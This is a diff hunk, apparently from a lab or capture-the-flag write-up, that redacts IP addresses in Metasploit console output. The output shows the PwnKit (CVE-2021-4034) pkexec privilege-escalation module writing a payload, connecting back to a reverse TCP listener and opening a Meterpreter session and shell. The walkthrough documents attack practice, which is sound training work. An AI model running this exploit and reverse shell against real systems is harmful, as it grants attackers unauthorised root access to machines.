@@ -267,17 +267,17 @@ msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set lport 9898
 lport => 9898
 msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > exploit
  
-[*] Started reverse TCP handler on 10.14.68.194:9898 
+[*] Started reverse TCP handler on <ip>:9898 
 [*] Running automatic check ("set AutoCheck false" to disable)
 [!] Verify cleanup of /tmp/.pltvpwc
 [+] The target is vulnerable.
 [*] Writing '/tmp/.zbzpuhuxuf/huogglp/huogglp.so' (548 bytes) ...
 [!] Verify cleanup of /tmp/.zbzpuhuxuf
-[*] Sending stage (3045380 bytes) to 10.10.22.192
+[*] Sending stage (3045380 bytes) to <ip>
 [+] Deleted /tmp/.zbzpuhuxuf/huogglp/huogglp.so
 [+] Deleted /tmp/.zbzpuhuxuf/.vtxjvu
 [+] Deleted /tmp/.zbzpuhuxuf
-[*] Meterpreter session 5 opened (10.14.68.194:9898 -> 10.10.22.192:59766) at 2024-02-04 18:35:48 +0100
+[*] Meterpreter session 5 opened (<ip>:9898 -> <ip>:59766) at 2024-02-04 18:35:48 +0100
 
 meterpreter > shell
 Process 5384 created.
